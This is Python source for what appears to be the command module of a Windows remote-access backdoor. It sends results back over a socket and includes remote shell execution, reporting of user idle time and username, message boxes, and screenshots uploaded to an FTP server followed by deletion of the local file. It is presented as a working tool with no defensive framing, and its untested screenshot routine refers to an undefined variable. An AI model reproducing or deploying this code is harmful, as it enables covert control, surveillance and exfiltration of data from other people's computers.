import subprocess,win32api,ctypes,getpass,sock,ftplib
import pyscreenshot as ImageGrab
class cmd:
    def __init__(self):
        self.command = 'cmd'
        self.description = 'shell command execution with cmd <command>\n'
        self.args = True
    def main(self,data):
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        return stdout_value
class getidletime:
    def __init__(self):
        self.command = 'getidletime'
        self.description = 'printing user idle time in seconds\n'
        self.args = False
    def main(self):
        return str((win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0)+'\n'
class getuser:
    def __init__(self):
        self.command = 'getusername'
        self.description = 'printing the username of the currently logged in user\n'
        self.args = False
    def main(self):
        return getpass.getuser()+'\n'
class messagebox:
    def __init__(self):
        self.command = 'messagebox'
        self.description = 'generating a custom messagebox with: messagebox <message>\n'
        self.args = True
    def main(self,args):
        Box = ctypes.windll.user32.MessageBoxA
        sock.sock.s.send("Box was opened\n")
        Box(None,args,"Message", 0)
        return "Message box was closed\n"
class screenshot:#not tested yet
    def __init__(self):
        self.command = 'screenshot'
        self.description = 'taking screenshot and uploading to ftp server with: screenshot <pass> <user> <server>\n'
        self.args = True
    def main(self,args):
        args = args.split(" ")
        password = args[0]
        user = args[1]
        server = args[2]
        session = ftplib.FTP(server,user,password)
        sock.sock.s.send("FTP SESSION OPENED\n")
        ImageGrab.grab_to_file("pic.jpg", childprocess=True, backend=None)
        sock.sock.s.send("SCREENSHOT TAKING FINISHED\n")
        pic = open(screenshotfile,'rb')
        session.storbinary("STOR pic.jpg",pic)
        pic.close()
        session.quit()
        sock.sock.s.send("FILE UPLOADED BEGINNING CLEANUP\n")
        proc = subprocess.Popen("del pic.jpg", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        return "CLEANUP FINISHED FILE UPLOADED\n"
class error:
    def __init__(self):
        self.command = 'error'
        self.description = 'sending an error message\n'
        self.args = False
    def main(self):
        sock.sock.s.send("ERROR\n")
